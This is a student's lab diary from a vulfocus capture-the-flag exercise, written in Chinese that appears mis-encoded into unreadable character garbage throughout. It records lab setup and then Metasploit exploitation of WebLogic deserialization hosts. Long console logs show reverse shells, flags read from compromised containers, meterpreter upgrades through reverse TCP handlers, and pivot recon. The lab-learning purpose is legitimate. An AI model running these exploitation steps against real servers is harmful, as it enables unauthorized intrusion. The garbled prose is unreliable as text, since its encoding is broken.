# å®éªŒæ—¥è®°

>This is Hoshi

## æ‚é¡¹è®°å½•

è™½ç„¶è¯´æ˜¯æ‚é¡¹è®°å½•ï¼Œæ•´ä½“è¿˜æ˜¯æ—¶é—´çº¿çš„é¡ºåºï¼Œå¹¶ä¸”ç¨å¾®è¿›è¡Œäº†å†…å®¹è§„æ•´ï¼Œæ¯”å¦‚å¯¹å†…å®¹åŒºåŸŸè¿›è¡Œäº†ä¸€å®šç¨‹åº¦çš„åˆ’åˆ†ï¼Œä½†ä¸å½±å“è¿˜æ˜¯å¾ˆä¹±

### ç¬¬é›¶å›åˆ

>å‰æœŸå‡†å¤‡çš„å›åˆï¼Œå› ä¸ºä¸ç®—æ­£å¼å¼€å§‹æ”»é˜²æ‰€ä»¥ï¼Œzero

- 2023å¹´7æœˆ12æ—¥ä¹‹å‰çš„å“ªä¸ªæ—¶å€™ï¼Œåœ¨æŸå°Kaliè™šæ‹Ÿæœºä¸Šå¯¹vulfocuså¹³å°è¿›è¡Œäº†æ­å»ºï¼ŒåŒæ—¶å¤ç°äº†rocké‡åˆ°çš„â€œåœºæ™¯å•†åº—ä¸èƒ½æ­£å¸¸å·¥ä½œâ€çš„é—®é¢˜ï¼Œé¡ºä¾¿æ‘¸ç´¢äº†æ·»åŠ ç½‘å¡çš„åŠŸèƒ½
- 2023å¹´7æœˆ12æ—¥ï¼Œå’Œrockè®¨è®ºä¹‹åå†³å®šæ‰‹æ“è§†é¢‘ä¸­æ¼”ç¤ºçš„æ ‡å‡†dmzä¸»æœºåœºæ™¯ï¼Œç”šè‡³ä½¿ç”¨äº†ä¸€æ ·çš„ç½‘å¡åç§°ã€ç½‘æ®µå’Œé•œåƒï¼Œå¹¶æˆåŠŸå¯åŠ¨äº†åœºæ™¯ï¼Œè™½ç„¶æ²¡æœ‰ç¡®è®¤åç»­æ­¥éª¤èƒ½ä¸èƒ½é¡ºåˆ©è¿›è¡Œï¼Œä½†æ˜¯å§‘ä¸”è®¤ä¸ºæ˜¯å®Œæˆäº†ä¸€éƒ¨åˆ†æ‘¸ç´¢

    ![screenShot](./img/2023-07-12-175824.png)

- 2023å¹´7æœˆ12æ—¥ï¼Œä¸ºäº†ç¡®ä¿å°ç»„æˆå‘˜èƒ½å¤Ÿæ­£ç¡®ä½¿ç”¨Gitè¿›è¡Œåˆç†çš„å·¥ä½œè®°å½•ï¼Œé‡æ–°å¤ä¹ äº†å¯†ç å­¦å°å­¦æœŸç©åˆ°åçš„Learn Git Branchingæ¸¸æˆï¼Œä¸è¿‡å€’æ˜¯å¾ˆå¿«å°±ä¸Šæ‰‹äº†ï¼Œè®°å¿†è¿™ä¸ªä¸œè¥¿è™½ç„¶æ¨¡ç³Šä½†æ˜¯å¤šå°‘è¿˜æ˜¯æœ‰ç‚¹åˆ†é‡çš„

    ![screenShot](./img/2023-07-12-170609.png)

- 2023å¹´7æœˆ13æ—¥ï¼Œä¹˜åé£æœºå›å®¶ï¼Œæ­£å¼æ–°å»ºåˆ†æ”¯hoshiï¼Œæ·»åŠ äº†åŒ…æ‹¬è¿™æ®µå†…å®¹åœ¨å†…çš„è¯¸å¤šæ–‡ä»¶ï¼Œæ‰“ç®—å°†æ—¥è®°å’ŒæŠ¥å‘Šåˆ†å¼€å­˜æ”¾äº†ï¼Œæ—¥è®°è¿™é‡Œéšæ„è®°å½•ä¸€äº›çäº‹ï¼ŒæŠ¥å‘Šçš„è¯è¿˜æ˜¯éœ€è¦å¥½å¥½æ•´ç†æ ¼å¼

    ![screenShot](./img/2023-07-13-231452.png)

- 2023å¹´7æœˆ15æ—¥ï¼Œå°è¯•æ›´æ”¹å®éªŒç¯å¢ƒçš„è§’è‰²é…ç½®ï¼ŒåŸæœ¬è®¡åˆ’ç”¨ä½œVictimä¸»æœºçš„VirtualBoxè™šæ‹ŸæœºKaliå°†è¢«ç”¨ä½œAttackerä¸»æœºï¼ŒåŸæœ¬è®¡åˆ’ç”¨ä½œAttackerä¸»æœºçš„WSL2ä¸­å®‰è£…çš„Kaliå­ç³»ç»Ÿå°†è¢«ç”¨ä½œVictimä¸»æœºï¼Œç†ç”±å¤§æ¦‚æ˜¯ä¸‹é¢çš„æƒ…å†µï¼š

  - ä¸ºäº†ç¡®ä¿WSL2ä¸­çš„Kalièƒ½å¤Ÿæ­£å¸¸å¯ç”¨ä¸ºWSLé€‚é…çš„Win-Kexæ¨¡å¼ï¼Œä¸èƒ½å°†WSL2çš„Kaliè®¾ç½®ä¸ºç”±systemdä½œä¸ºPID 1å¼•å¯¼å¯åŠ¨çš„å®Œæ•´è™šæ‹Ÿæœºï¼ˆWSL2æœ¬èº«æ˜¯å¯ä»¥é€šè¿‡æ·»åŠ é…ç½®æ¥å®ç°ç”±systemdå¯åŠ¨çš„ï¼‰ï¼Œè€Œè¦ä½¿ç”¨ç±»ä¼¼chrootçš„æ–¹å¼ï¼Œæ­¤æ—¶ä½¿ç”¨metasploit frameworkæ—¶ï¼Œå¦‚æœè¦å¯ç”¨æ•°æ®åº“æ¥è®°å½•æ“ä½œï¼Œå…¶è‡ªåŠ¨åŒ–æ¨¡å¼æ˜¯é€šè¿‡systemdå¯åŠ¨æ•°æ®åº“ï¼Œäºæ˜¯ä¼šå‡ºç°å¾ˆç›´ç™½çš„æ— æ³•å¯åŠ¨çš„é—®é¢˜ï¼Œè™½ç„¶è¯´å¯ä»¥é€šè¿‡æ‰‹åŠ¨ç®¡ç†æ•°æ®åº“æœåŠ¡ï¼Œä½†è€ƒè™‘åˆ°æŠ˜è…¾é‡è¿˜æ˜¯é€‰æ‹©äº†äº¤æ¢Victimå’ŒAttackerä¸»æœºï¼Œæ¯•ç«Ÿå•å°±dockeræ¥è¯´ï¼Œå› ä¸ºä¹‹å‰å·²ç»æ‰‹åŠ¨é…ç½®äº†æœåŠ¡å¯åŠ¨æ‰€ä»¥å’Œå®é™…ä½¿ç”¨è™šæ‹Ÿæœºå¹¶æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«äº†

    ![screenShot](./img/2023-07-15-125934.png)

- 2023å¹´7æœˆ15æ—¥ï¼Œè®°ä¸æ¸…æ˜¯ä¸æ˜¯å·²ç»è¯´è¿‡äº†ï¼Œä½†æ˜¯è¿˜æ˜¯è®°å½•ä¸€ä¸‹ï¼ŒUSTCå·²ç»åœæ­¢å¯¹æ ¡å¤–æä¾›docker hubçš„é•œåƒæºäº†ï¼Œå®˜ç½‘ä¸Šæœ‰è¯´æ˜ï¼Œ[ctf-gamesä¸­å…³äºvulfocusçš„READMEè¿˜æ²¡æ”¹](https://github.com/c4pr1c3/ctf-games/tree/master/fofapro/vulfocus)ï¼Œä»ç„¶æ˜¯catä¸­ç§‘å¤§é•œåƒæºğŸ¤”

  ![screenshot](./img/2023-07-15-124831.png)

  - 2023å¹´7æœˆ19æ—¥ï¼Œæƒ³èµ·æ¥äº†æ‰€ä»¥è¿½åŠ äº†ä¸€ä¸‹ï¼Œå¯ä»¥ç”¨[NJUçš„é•œåƒ](https://mirrors.nju.edu.cn/)ï¼ŒğŸ‘ˆå‰é¢çš„æ˜¯ä¸»é¡µï¼Œ[è¿™é‡Œæ˜¯å¯¹åº”çš„æ¢æºæ–‡æ¡£](https://doc.nju.edu.cn/books/35f4a/page/docker-hub)

### ç¬¬ä¸€å›åˆ

>ä»çº¢è“æ”»é˜²å¯¹æŠ—çš„è§†è§’æ¥è€ƒè™‘ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯çº¢æ–¹ç¬¬ä¸€æ¬¡å¯¹æ•´ä¸ªåœºæ™¯è¿›è¡Œæ¨¡æ‹Ÿæ¸—é€çš„å›åˆï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€å›åˆï¼Œè¿™ä¹‹åè¿˜ä¼šæœ‰åç»­çš„å›åˆæ‰å¯¹ï¼ˆç†è®ºä¸Šï¼‰

- 2023å¹´7æœˆ15æ—¥ï¼Œè°ƒæ¢Victimä¸»æœºå’ŒAttackerä¸»æœºä¹‹åæœç„¶ä¸€åˆ‡é¡ºåˆ©ï¼Œå…ˆæ˜¯æ­£å¸¸åˆå§‹åŒ–äº†Metaspolitçš„æ•°æ®åº“ï¼Œç„¶åä¹Ÿé¡ºç€æ•™ç¨‹æ‹¿åˆ°äº†ç¬¬ä¸€å°æœºå™¨çš„flag

  ![screenShot](./img/2023-07-15-213407.png)

  ![screenShot](./img/2023-07-15-213411.png)

  ![screenShot](./img/2023-07-15-224012.png)

  ![screenShot](./img/2023-07-15-224519.png)

  æœ‰è¶£çš„æ˜¯rockä¼¼ä¹é‡åˆ°äº†å’Œæˆ‘å¼€å§‹æ‰“ç®—ç”¨WSLä½œä¸ºAttackerä¸»æœºä½¿ç”¨æ—¶å¾ˆåƒçš„msfdbåˆå§‹åŒ–é—®é¢˜ï¼Œç›®å‰è¿˜ä¸æ¸…æ¥šä»–å…·ä½“é‡åˆ°äº†ä»€ä¹ˆé—®é¢˜

- 2023å¹´7æœˆ17æ—¥ï¼Œæ˜¨å¤©ï¼ˆ16æ—¥ï¼‰ä¸€æ•´å¤©éƒ½å› ä¸ºç”µè„‘ä¸çŸ¥é“åŸå› çš„é»‘å±æ­»æœºè€ŒæŠ˜è…¾ï¼Œè¿›åº¦ä¹Ÿå› ä¸ºæ­»æœºé‡å¯æ•°æ®æˆªå›¾å®Œå…¨æ²¡æœ‰å¾—åˆ°ä¿ç•™...å¹¶ä¸æ˜¯è¯´ä»Šå¤©ç”µè„‘å°±å¥½äº†ï¼Œåªèƒ½ä¸€è¾¹ç¥ˆç¥·ç€ä¸å‡ºé—®é¢˜ä¸€è¾¹å°½å¯èƒ½å¤šç•™ä¸‹ä¸€äº›æˆªå›¾ä¹‹ç±»çš„ä¸œè¥¿

- 2023å¹´7æœˆ17æ—¥ï¼Œé¡ºåˆ©åœ¨æ²¡æœ‰é»‘å±çš„æƒ…å†µä¸‹æ‰§è¡Œåˆ°äº†ç¬¬äºŒå±‚å†…ç½‘ä¸‰å°weblogicæ¼æ´ä¸»æœºçš„flagï¼Œè™½ç„¶ä¸ºäº†çœäº‹åœ¨ä¸»æœºå­˜æ´»æ‰«æå’Œexploitæœç´¢æ—¶éƒ½ç›´æ¥ä½¿ç”¨äº†ç™½ç›’ç«¯å£å’ŒCVEç›´æ¥æœç´¢

  å¦å¤–æ˜¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­å‘ç°çš„ï¼Œmetasploitåœ¨æ·»åŠ optionsæ—¶å¯ä»¥ä½¿ç”¨ç±»ä¼¼æ­£åˆ™çš„è¡¨è¾¾æ¥ä¸€æ¬¡runæ‰§è¡Œå¤šä¸ªä¸»æœºçš„exploitï¼Œæ•ˆæœçš„è¯å°±å’Œä¸‹å›¾çš„æ•ˆæœä¸€æ ·ï¼š

  ![screenShot](./img/2023-07-17-191855.png)

  å¾ˆæ˜¾ç„¶ä¸­é—´å› ä¸ºæœ‰ä¸ª192.170.84.4æ˜¯å¤–å±‚struts2æ¼æ´çš„ä¸»æœºå¯¼è‡´ç ´è§£å¤±è´¥ï¼Œä¸è¿‡å¦å¤–ä¸‰å°ä¸»æœºéƒ½æ²¡æœ‰é—®é¢˜ï¼Œä¼šåœ¨sessionsé‡Œé¢ç›´æ¥getåˆ°3ä¸ªä¼šè¯ï¼Œç›´æ¥æ¥å…¥è¿›å»æŸ¥çœ‹flagå°±å¥½ï¼Œæ“ä½œçš„è¯å§‘ä¸”ç”¨ä¸‹é¢çš„code blockè¿›è¡Œè®°å½•ï¼š

  ```metasploit
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions

  Active sessions
  ===============

    Id  Name  Type                   Information          Connection
    --  ----  ----                   -----------          ----------
    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58718 (172.29.108.146)
    2         meterpreter x86/linux  root @ 192.170.84.4  192.168.56.107:4433 -> 192.168.56.1:58648 (172.29.108.146)
    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58646 (192.170.84.2)
    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58662 (192.170.84.3)
    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58702 (192.170.84.5)

  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 3
  [*] Starting interaction with 3...

  ls /tmp
  bea1061393648233859820.tmp
  cookie.txt
  flag-{bmh847737fd-8975-4b37-b977-f50474a56937}
  hsperfdata_root
  packages
  wlstTemproot
  ^Z
  Background session 3? [y/N]  y
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 4
  [*] Starting interaction with 4...

  ls /tmp
  bea1061393648233859820.tmp
  cookie.txt
  flag-{bmh0b089d55-4a89-41ea-b31f-e8f775ce1952}
  hsperfdata_root
  packages
  wlstTemproot
  ^Z
  Background session 4? [y/N]  y
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 5
  [*] Starting interaction with 5...

  ls /tmp
  bea1061393648233859820.tmp
  cookie.txt
  flag-{bmh0d1008a5-7a3d-43c8-a6a9-03fadae3bd8d}
  hsperfdata_root
  packages
  wlstTemproot
  ^Z
  Background session 5? [y/N]  y
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
  ```

  åˆ†åˆ«å°†flagè´´åˆ°vulfocusçš„åœºæ™¯ä¸­å°±å¯ä»¥çœ‹åˆ°è¿›åº¦å·²ç»æ¥åˆ°80%äº†ï¼Œå¤§é¡ºåˆ©~

  ![screenShot](./img/2023-07-17-192034.png)

  å”¯ä¸€çš„ç–‘æƒ‘æ˜¯ä¸ºä»€ä¹ˆæ˜æ˜è¿˜æœ‰ä¸€å°nginxçš„phpæ¼æ´ä¸»æœºæ²¡äº¤flagï¼Œä½†æ˜¯å´å·²ç»æ˜¾ç¤ºå·²å®Œæˆäº†ğŸ¤”

- 2023å¹´7æœˆ17æ—¥ï¼Œå°†å‰è¿°éƒ¨åˆ†åˆšåˆšå¾—åˆ°çš„3ä¸ªæ™®é€šä¼šè¯å‡çº§meterpreteræ—¶é‡åˆ°é—®é¢˜ï¼Œå‡çº§å¤±è´¥ï¼ŒæŠ¥é”™æƒ…å†µå¦‚ä¸‹ï¼š

  ```metasploit
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 3-5
  [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3, 4, 5]

  [*] Upgrading session ID: 3
  [-] Post failed: NoMethodError undefined method `include?' for nil:NilClass
  [-] Call stack:
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:114:in `set_is_echo_shell'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:135:in `shell_command_token_base'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:122:in `shell_command_token_unix'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:91:in `shell_command_token'
  [-]   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:132:in `cmd_exec'
  [-]   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:114:in `run'
  [*] Sleeping 5 seconds to allow the previous handler to finish..
  [*] Upgrading session ID: 4
  [-] Post failed: NoMethodError undefined method `include?' for nil:NilClass
  [-] Call stack:
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:114:in `set_is_echo_shell'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:135:in `shell_command_token_base'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:122:in `shell_command_token_unix'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:91:in `shell_command_token'
  [-]   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:132:in `cmd_exec'
  [-]   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:114:in `run'
  [*] Sleeping 5 seconds to allow the previous handler to finish..
  [*] Upgrading session ID: 5
  [-] Post failed: NoMethodError undefined method `include?' for nil:NilClass
  [-] Call stack:
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:114:in `set_is_echo_shell'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:135:in `shell_command_token_base'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:122:in `shell_command_token_unix'
  [-]   /usr/share/metasploit-framework/lib/msf/core/session/provider/single_command_shell.rb:91:in `shell_command_token'
  [-]   /usr/share/metasploit-framework/lib/msf/core/post/common.rb:132:in `cmd_exec'
  [-]   /usr/share/metasploit-framework/modules/post/multi/manage/shell_to_meterpreter.rb:114:in `run'
  [*] Sleeping 5 seconds to allow the previous handler to finish..
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions

  Active sessions
  ===============

    Id  Name  Type                   Information          Connection
    --  ----  ----                   -----------          ----------
    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58718 (172.29.108.146)
    2         meterpreter x86/linux  root @ 192.170.84.4  192.168.56.107:4433 -> 192.168.56.1:58648 (172.29.108.146)
    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58646 (192.170.84.2)
    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58662 (192.170.84.3)
    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58702 (192.170.84.5)

  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
  ```

  å¯ä»¥çœ‹åˆ°ä¼¼ä¹éƒ½æ˜¯ä¸€ä¸ªåœ°æ–¹é‡åˆ°é—®é¢˜äº†

- 2023å¹´7æœˆ17æ—¥ï¼Œé’ˆå¯¹ä¸Šé¢çš„é—®é¢˜å¤§æ¦‚æ£€æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°æ˜¯ç»™Victimåˆ†é…çš„å†…å­˜å¤ªå°äº†ï¼Œå¯¼è‡´åœ¨å¼€å¯æŠ“åŒ…åå¾ˆå¿«å°±çˆ†å†…å­˜äº†ï¼Œå€’ä¸æ˜¯metasploitçš„é—®é¢˜ï¼Œåªæ˜¯åœºæ™¯ä¸»æœºæ²¡æœ‰å“åº”äº†ï¼Œä½¿ç”¨æ™®é€šsessionsçš„shellä¹Ÿæ˜¯æ­»æœºçŠ¶æ€ğŸ˜”  
  è¿™ä¸‹åˆè¦é‡å¼€äº†ï¼Œç»æœ›

- 2023å¹´7æœˆ17æ—¥ï¼ŒçœŸçš„å¾ˆæƒ³éª‚vulfocusè¿™ä¸ªå¹³å°çš„å¥å£®æ€§ï¼Œåœºæ™¯å¦‚æœä¸æ‰‹åŠ¨åœæ­¢å°±ä¼šå‡ºç°åœäº†vulfocuså®¹å™¨ä½†æ˜¯ç¯å¢ƒå®¹å™¨è¿˜åœ¨è¿è¡Œçš„æƒ…å†µï¼Œé‡æ–°å¼€å¯vulfocuså¹³å°åˆ™ä¼šç›´æ¥æœåŠ¡å™¨é”™è¯¯ï¼Œåœºæ™¯ã€é•œåƒã€ç½‘å¡ç­‰é…ç½®å…¨éƒ¨æ¸…ç©ºï¼Œæ˜“ç”¨æ€§æ‹‰æ»¡äº†å±äºæ˜¯

- 2023å¹´7æœˆ17æ—¥ï¼Œé‡æ–°å¿«é€Ÿèµ°äº†ä¸€åŠçš„æµç¨‹ï¼Œä»ç„¶æ˜¯å¿«é€Ÿå‡çº§æ‹¿åˆ°çš„3ä¸ªæ™®é€šä¼šè¯ï¼Œæ­¤æ—¶å·²ç»æ²¡æœ‰é—®é¢˜äº†ï¼š

  ```metasploit
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -u 3-5
  [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [3, 4, 5]

  [*] Upgrading session ID: 3
  [*] Starting exploit/multi/handler
  [*] Started reverse TCP handler on 192.168.56.107:4433
  [*] Sending stage (1017704 bytes) to 192.168.56.1
  [*] Command stager progress: 100.00% (773/773 bytes)
  [*] Sleeping 5 seconds to allow the previous handler to finish..
  [*] Meterpreter session 6 opened (192.168.56.107:4433 -> 192.168.56.1:58666) at 2023-07-17 08:35:07 -0400
  [*] Stopping exploit/multi/handler
  [*] Upgrading session ID: 4
  [*] Starting exploit/multi/handler
  [*] Started reverse TCP handler on 192.168.56.107:4433
  [*] Sending stage (1017704 bytes) to 192.168.56.1
  [*] Command stager progress: 100.00% (773/773 bytes)
  [*] Sleeping 5 seconds to allow the previous handler to finish..
  [*] Meterpreter session 7 opened (192.168.56.107:4433 -> 192.168.56.1:58680) at 2023-07-17 08:35:20 -0400
  [*] Stopping exploit/multi/handler
  [*] Upgrading session ID: 5
  [*] Starting exploit/multi/handler
  [*] Started reverse TCP handler on 192.168.56.107:4433
  [*] Sending stage (1017704 bytes) to 192.168.56.1
  [*] Command stager progress: 100.00% (773/773 bytes)
  [*] Sleeping 5 seconds to allow the previous handler to finish..
  [*] Meterpreter session 8 opened (192.168.56.107:4433 -> 192.168.56.1:58684) at 2023-07-17 08:35:33 -0400
  [*] Stopping exploit/multi/handler
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions

  Active sessions
  ===============

    Id  Name  Type                   Information          Connection
    --  ----  ----                   -----------          ----------
    1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58690 (172.29.108.146)
    2         meterpreter x86/linux  root @ 192.171.84.5  192.168.56.107:4433 -> 192.168.56.1:58654 (172.29.108.146)
    3         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58628 (192.171.84.2)
    4         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58676 (192.171.84.3)
    5         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:58712 (192.171.84.4)
    6         meterpreter x86/linux  root @ 192.171.84.2  192.168.56.107:4433 -> 192.168.56.1:58666 (192.171.84.2)
    7         meterpreter x86/linux  root @ 192.172.85.3  192.168.56.107:4433 -> 192.168.56.1:58680 (192.171.84.3)
    8         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:58684 (192.171.84.4)

  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) >
  ```

  ç”±äºé‡å¯ï¼ˆå‡†ç¡®æ¥è¯´æ˜¯é‡é“¸ï¼‰äº†ç¯å¢ƒæ‰€ä»¥IPå’Œç«¯å£æœ‰å˜åŒ–ï¼Œä¸è¿‡ä¸å½±å“ï¼Œè¿™æ¬¡æ˜¯åœ¨192.171.84.3ä¸Šæ‰¾åˆ°äº†ç¬¬äºŒå¼ ç½‘å¡ï¼ŒIPåœ°å€ä¸º192.172.85.3ï¼š

  ```metasploit
  msf6 exploit(multi/misc/weblogic_deserialize_asyncresponseservice) > sessions -i 7
  [*] Starting interaction with 7...

  meterpreter > ipconfig

  Interface  1
  ============
  Name         : lo
  Hardware MAC : 00:00:00:00:00:00
  MTU          : 65536
  Flags        : UP,LOOPBACK
  IPv4 Address : 127.0.0.1
  IPv4 Netmask : 255.0.0.0


  Interface 17
  ============
  Name         : eth1
  Hardware MAC : 02:42:c0:ab:54:03
  MTU          : 1500
  Flags        : UP,BROADCAST,MULTICAST
  IPv4 Address : 192.171.84.3
  IPv4 Netmask : 255.255.255.0


  Interface 21
  ============
  Name         : eth0
  Hardware MAC : 02:42:c0:ac:55:03
  MTU          : 1500
  Flags        : UP,BROADCAST,MULTICAST
  IPv4 Address : 192.172.85.3
  IPv4 Netmask : 255.255.255.0

  meterpreter >
  ```

  è¿™é‡ŒåŸæœ¬å†³å®šæ¢ä¸€ä¸ªå’Œè§†é¢‘ä¸ä¸€æ ·çš„æ–¹å¼æ¥è·å–flagï¼Œå°è¯•ä¸ç¦»å¼€msfconsoleï¼Œé€šè¿‡å¥—autorouteè·¯ç”±çš„æ–¹å¼ï¼ˆå…¶å®å°±æ˜¯ä»å¤–å±‚åˆ°ä¸­å±‚çš„æ–¹å¼ï¼‰ï¼Œä½†æ˜¯å‘ç°è¿™ä¸ªIPä¼¼ä¹æ˜¯ä¼šè·³åˆ°å¤–ç½‘å»äº†ï¼Œtracerouteäº†ä¸€ä¸‹è·³äº†ä¸çŸ¥é“å¤šå°‘ä¸ªè·¯ç”±ï¼ŒçœŸçš„ç”¨nmapå»æ‰«192.172.85.0/24çš„æ—¶å€™254å°ä¸»æœºå…¨éƒ¨åœ¨çº¿ï¼Œæ€»æ„Ÿè§‰è¦çªç ´ä¸€äº›ä¸è¯¥çªç ´çš„è¾¹ç•Œäº†ï¼Œå§‘ä¸”å…ˆåˆ°è¿™é‡Œï¼Œå¾—é‡å¯ä¸€ä¸‹ç¯å¢ƒæ‰è¡ŒğŸ˜°

- 2023å¹´7æœˆ18æ—¥ï¼Œé‡å¯åœºæ™¯è€Œä¸æ˜¯é‡å¯ç¯å¢ƒä¹‹åå°è¯•äº†ä¸€ä¸‹ç”¨ç©·ä¸¾1-65535ç«¯å£é€šè¿‡struts2æ¼æ´ä¸»æœºæ‰«æç¬¬ä¸€å±‚å†…ç½‘254å°å¯èƒ½å¼€å¯çš„ä¸»æœºï¼Œç»“æœæ˜¯æ‰«äº†åŠä¸ªå°æ—¶ï¼ŒæŠ“äº†11ä¸‡ä¸ªåŒ…ï¼Œè¿˜æ²¡æœ‰æ‰«å‡ºä¸€å°ä¸»æœºï¼Œåªèƒ½è¯´çº¢æ–¹æ‘¸é»‘æ˜¯çœŸä¸å¥½æ“ä½œ

  ![screenShot](./img/2023-07-18-123609.png)

  äºæ˜¯å¼•å‘äº†ä¸€äº›å…³äºçº¢è“ä¸¤æ–¹éš¾åº¦çš„æ€è€ƒï¼Œå‡è®¾ç¨å¾®é€¼çœŸä¸€ç‚¹å»æ¨¡æ‹Ÿè¿™ä¸ªåœºæ™¯ï¼Œçº¢æ–¹å¦‚ä½•åœ¨æ²¡æœ‰ç¤¾å·¥çš„å‰æä¸‹è·å–åˆ°å¼€å¯æœåŠ¡çš„ä¿¡æ¯æ¥â€œæœ€å°åŒ–åŠ¨é™â€ï¼Œå½“ç„¶ç©·ä¸¾å¸¸ç”¨æœåŠ¡çš„ç«¯å£æ˜¯ä¸€ç§åŠæ³•ï¼Œå¦‚æœå¯¹æ–¹ç¨å¾®æœ‰ä¸€ç‚¹å¯¹æŠ—æ„è¯†ï¼Œå°†æœåŠ¡å¼€æ”¾åœ¨é«˜ä½éšæœºç«¯å£çš„è¯å…¶å®å°±å¾ˆéº»çƒ¦äº†ï¼Œä¸è®¡æ—¶é—´å’Œç®—åŠ›æˆæœ¬åœ°æ¯¯å¼æ‰«æçš„è¯ï¼Œæœ‰æ²¡æœ‰è®°å½•å–è¯éƒ½å¦è¯´ï¼Œå¤§ä¸äº†ç”¨åƒµå°¸ç½‘ç»œç¾¤èµ·è€Œæ”»ä¹‹ï¼Œä¹Ÿä¸ä¼šæš´éœ²çœŸå®çš„æ”»å‡»è€…ä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœå†…å±‚ç½‘ç»œä¹ŸåŠ å…¥ä¸€äº›åƒæ˜¯å¯¹æ‰«æçš„è¿‡æ»¤ï¼Œç±»ä¼¼é˜²ç«å¢™çš„æ„Ÿè§‰çš„è¯ï¼Œé‚£å°±ï¼Œåªèƒ½æ‰£ggäº†ğŸ˜‚

  è“æ–¹çš„è¯ï¼Œè®¾é˜²å¤§æ¦‚å°±æ˜¯ä¸Šé¢çš„æ€è·¯ï¼Ÿç°åœ¨æ¥çœ‹â€œè—èµ·æ¥â€å…¶å®æ˜¯å¾ˆå¥½çš„è§„é¿æ¼æ´è¢«å‘ç°åˆ°åˆ©ç”¨çš„æ–¹å¼ï¼Œå½“ç„¶å¯¹å¤–ç½‘æä¾›æœåŠ¡çš„ä¸»æœºè‚¯å®šæ˜¯æ²¡æœ‰åŠæ³•äº†ï¼Œæ¯•ç«Ÿå¯åˆ©ç”¨çš„é«˜å±æ¼æ´åœ¨æ›å…‰å‡ºæ¥ä¹‹å‰å…¶å®æ˜¯0dayæ€§è´¨ä¸€æ ·çš„ä¸œè¥¿ï¼Œåªæœ‰åæ‰‹ä¿®è¡¥çš„æœºä¼šï¼Œç„¶è€Œå¤šæ•°æƒ…å†µä¸‹å­˜åœ¨æ¼æ´çš„ç¨‹åºæ˜¯æœåŠ¡æä¾›è€…ç»´æŠ¤çš„å¯èƒ½æ€§å¾ˆå°ï¼Œå°±éœ€è¦ç­‰å¾…ä¸Šæ¸¸çš„å®‰å…¨è¡¥ä¸ï¼Œæ‰€ä»¥æ›´å¤šçš„æƒ…å†µä¸‹è¿˜æ˜¯åœ¨æ¼æ´åˆ©ç”¨æ–¹å¼ä¸Šçš„ä¿®è¡¥ï¼Œæˆ–è€…è¯´ï¼Œç›´æ¥ç‰ºç‰²å¯ç”¨æ€§åœç”¨æœåŠ¡ğŸ¤”ï¼Ÿç»æµæ•ˆç›Šæ€ä¹ˆåŠï¼Ÿå†³ç­–ï¼Ÿ

  å§‘ä¸”å…ˆå‘æ•£åˆ°è¿™é‡Œï¼Œç»§ç»­æŠ˜è…¾åé¢æœ€åä¸€å°ä¸»æœºå»äº†ğŸ˜‚

